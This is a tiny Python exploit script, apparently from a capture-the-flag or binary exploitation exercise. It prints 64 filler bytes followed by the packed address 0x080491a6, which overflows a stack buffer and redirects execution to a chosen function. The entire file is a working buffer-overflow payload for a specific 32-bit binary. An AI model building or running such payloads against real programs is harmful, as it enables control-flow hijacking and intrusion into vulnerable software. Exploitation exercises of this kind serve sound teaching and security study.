#! /bin/python3

import struct
import sys

buffer = b'A'*64
#payload = b'\xa6\x91\x04\x08'
payload = struct.pack('I', 0x080491a6)

sys.stdout.buffer.write(buffer+payload)
